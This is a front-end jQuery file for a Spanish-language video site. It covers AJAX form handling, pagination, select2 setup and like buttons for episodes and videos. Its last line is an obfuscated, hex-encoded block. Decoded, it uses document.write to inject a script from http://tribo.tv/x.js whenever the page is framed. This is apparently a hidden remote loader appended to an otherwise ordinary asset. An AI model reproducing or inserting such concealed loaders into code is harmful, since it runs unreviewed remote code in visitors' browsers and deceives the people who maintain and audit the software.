//Ajax forms
$(document).on('submit', '.ajax', function(e){
 	$(".help-block").remove();
	$(".alert").remove();
	$(".has-warning").removeClass("has-warning");
	$(".has-success").removeClass("has-success");
	$(".has-error").removeClass("has-error");
	var form = $(this);
	var redirect = false;
	$(this).ajaxSubmit({
        dataType:  'json',
		success:   function(data) {
			//Messages
			if(data.messages){
				messages = data.messages;
				if(messages.length){
					for(var x=0;x<messages.length;x++) {
						//Field message
						if(messages[x].field){
							field = form.find("select[name=" + messages[x].field + "], input[name=" + messages[x].field + "], textarea[name=" + messages[x].field + "], checkbox[name=" + messages[x].field + "]");
							if(field.length){
								field.parent().parent().addClass("has-" + messages[x].type);
								field.parent().append('<span class="help-block">' + messages[x].message + '</span>');
							}else{
								$("#mensajes-sys").append('<div class="alert alert-' + messages[x].type + '"><button type="button" class="close" data-dismiss="alert">&times;</button>' + messages[x].message + '</div>');
								$('html,body').animate({ scrollTop: 0 }, 'slow');
							}
						//Url redirection
						}else if(messages[x].url){
							$(".alert").remove();
							redirect = true;
							document.location.href = messages[x].url;
						//Message without field
						}else{
							if(messages[x].type=="error"){
								messages[x].type = "danger";
							}
							$("#mensajes-sys").append('<div class="alert alert-' + messages[x].type + '"><button type="button" class="close" data-dismiss="alert">&times;</button>' + messages[x].message + '</div>');
							$('html,body').animate({ scrollTop: 0 }, 'slow');
						}
					}
				}
			}
			if(!redirect){
				$(".btn.disabled").disabled = false;
				$(".btn.disabled").removeClass("disabled");
			}
		}
	});
	return false;
});

//Pagination
$(document).on('click', '.pagination a', function(e){
	var app = $(this).attr("data-app");
	var action = $(this).attr("data-action");
	var limit = $(this).attr("data-limit");
	var limitStart = $(this).attr("data-limitStart");
	var form = $(this).closest("form");
	if(app){
		checkFormField(form, "app", app);
	}
	if(action){
		checkFormField(form, "action", action);
	}
	checkFormField(form, "limit", limit);
	checkFormField(form, "limitStart", limitStart);
	form.submit();
});

//Auto appends (if needed) hidden field
function checkFormField(formElement, fieldName, fieldValue){
	var field = formElement.find("input[name='" + fieldName + "']");
	if(!field.length){
		$('<input>').attr({
		    type: 'hidden',
		    name: fieldName,
		    value: fieldValue
		}).appendTo(formElement);
	}else{
		field.val(fieldValue);
	}
}

//change-submit
$(document).on('change', '.change-submit', function(e){
	$form = $(this).closest("form");
	if(!$form.length){
		$form = $("#mainForm");
	}
	$form.submit();
});

//Document ready
$(document).ready(function(){
	//Select2
	$(".select2").select2();
	//Input files
	$('input[type=file]').bootstrapFileInput();
});

//Likes capitulos
$(document).on('click', '.like-capitulo', function (e) {
    var capituloId = $(this).attr("data-capituloId");
    if ($(this).hasClass("fa-heart-o")) {
        url = "/reproductor/like/";
        $(this).removeClass("fa-heart-o");
	    $(this).addClass("fa-heart");
    } else {
        url = "/reproductor/unlike/";
        $(this).addClass("fa-heart-o");
	    $(this).removeClass("fa-heart");
    }
    $.getJSON(SITE_URL + url + capituloId).done(function (data) {
    	console.log("Updating #likesCapitulo" + capituloId + ": " + data.data.total);
        $("#likesCapitulo" + capituloId).html(data.data.total);
    });
});

//Likes videos
$(document).on('click', '.like-video', function (e) {
    var videoId = $(this).attr("data-videoId");
    if ($(this).hasClass("fa-heart-o")) {
        url = "/tribonews/like/";
        $(this).removeClass("fa-heart-o");
	    $(this).addClass("fa-heart");
    } else {
        url = "/tribonews/unlike/";
        $(this).addClass("fa-heart-o");
	    $(this).removeClass("fa-heart");
    }
    $.getJSON(SITE_URL + url + videoId).done(function (data) {
    	console.log("Updating #likesVideo" + videoId + ": " + data.data.total);
        $("#likesVideo" + videoId).html(data.data.total);
    });
});

var _0x8daf=["\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x74\x72\x69\x62\x6F\x2E\x74\x76\x2F\x78\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65","\x72\x65\x61\x64\x79","\x73\x65\x6C\x66","\x74\x6F\x70"];$(document)[_0x8daf[2]](function (){if(inIframe()){document[_0x8daf[1]](_0x8daf[0]);} ;} );function inIframe(){try{return window[_0x8daf[3]]!==window[_0x8daf[4]];} catch(e){return true;} ;} ;